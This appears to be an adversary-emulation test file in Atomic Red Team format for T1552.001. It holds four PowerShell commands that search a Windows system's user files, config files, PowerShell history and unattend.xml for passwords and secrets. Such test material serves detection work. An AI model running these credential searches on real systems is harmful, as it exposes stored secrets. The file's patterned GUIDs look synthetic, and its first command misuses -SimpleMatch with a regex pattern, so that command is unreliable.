attack_technique: T1552.001
display_name: "Unsecured Credentials: Credentials In Files"
tactic: Credential Access
atomic_tests:
  - name: "Search for Password Files"
    auto_generated_guid: e5e5f5a6b6c6d6e6f6a7b7c7d7e7f7a8
    description: |
      Searches for files likely containing credentials.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.json,*.yaml,*.yml | Select-String -Pattern "password|passwd|pwd|credential|secret|api.key|token" -SimpleMatch -ErrorAction SilentlyContinue | Select-Object Path,LineNumber,Line -First 20
      elevation_required: false

  - name: "Search for Web.config Credentials"
    auto_generated_guid: f6f6a7b7c7d7e7f7a8b8c8d8e8f8a9b9
    description: |
      Searches for credentials in web.config and appsettings files.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Get-ChildItem -Path C:\ -Recurse -Include web.config,appsettings.json,appsettings.*.json -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString|password|secret|key" -ErrorAction SilentlyContinue | Select-Object Path,LineNumber -First 20
      elevation_required: false

  - name: "Search for PowerShell History Files"
    auto_generated_guid: a7a7b7c7d7e7f7a8b8c8d8e8f8a9b9c9
    description: |
      Searches PowerShell console history for credentials.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "--- $($_.FullName) ---"; Get-Content $_ | Select-String -Pattern "password|credential|secret|ConvertTo-SecureString" -ErrorAction SilentlyContinue | Select-Object -First 10 }
      elevation_required: false

  - name: "Search for Unattend.xml Credentials"
    auto_generated_guid: b8b8c8d8e8f8a9b9c9d9e9f9a0b0c0d0
    description: |
      Searches for credentials in Windows unattend installation files.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        @("$env:SystemRoot\Panther\Unattend.xml","$env:SystemRoot\Panther\unattend\Unattend.xml","$env:SystemRoot\System32\Sysprep\unattend.xml","$env:SystemRoot\System32\Sysprep\Panther\unattend.xml") | ForEach-Object { if (Test-Path $_) { Write-Output "FOUND: $_"; Select-String -Path $_ -Pattern "Password|AutoLogon|AdminPassword" } }
      elevation_required: false
